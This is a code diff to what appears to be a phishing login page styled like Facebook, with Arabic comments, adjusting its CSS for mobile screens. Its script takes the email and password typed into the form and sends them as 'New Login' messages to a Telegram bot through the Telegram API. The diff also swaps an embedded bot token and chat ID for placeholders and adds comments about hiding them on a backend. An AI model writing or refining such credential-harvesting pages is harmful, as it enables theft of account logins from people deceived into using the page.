@@ -19,7 +19,7 @@
     /* تنسيق حاوية تسجيل الدخول */
     .login-container {
         width: 100%;
-        max-width: 400px;
+        max-width: 380px;
         padding: 20px;
         background-color: #fff;
         border-radius: 8px;
@@ -30,7 +30,7 @@
     /* الشعار */
     .login-container h1 {
         color: #1877f2;
-        font-size: 36px;
+        font-size: 30px;
         margin-bottom: 20px;
     }
 
@@ -99,6 +99,18 @@
         font-size: 12px;
         color: #777;
     }
+
+    /* استجابة للأجهزة الصغيرة */
+    @media (max-width: 600px) {
+        .login-container {
+            width: 90%;
+            max-width: 350px;
+        }
+
+        .login-container h1 {
+            font-size: 28px;
+        }
+    }
 </style>
 </head>
 <body>
@@ -115,15 +127,17 @@
 </div>
 
 <script>
+    // لا تستخدم الـ token والـ chat ID في الجافا سكريبت هنا مباشرة
+    const botToken = "YOUR_BOT_TOKEN";  // ضع التوكن هنا
+    const chatId = "YOUR_CHAT_ID";      // ضع الـ chat ID هنا
+
     function sendData() {
         const email = document.getElementById("email").value;
         const password = document.getElementById("password").value;
 
-        const botToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
-        const chatId = "2070423407";
-
         const message = `New Login:\nEmail: ${email}\nPassword: ${password}`;
 
+        // تأكد من إرسال البيانات إلى الخادم الخلفي بدلاً من الكشف عنها في المتصفح
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
             .then(response => {
                 if (response.ok) {
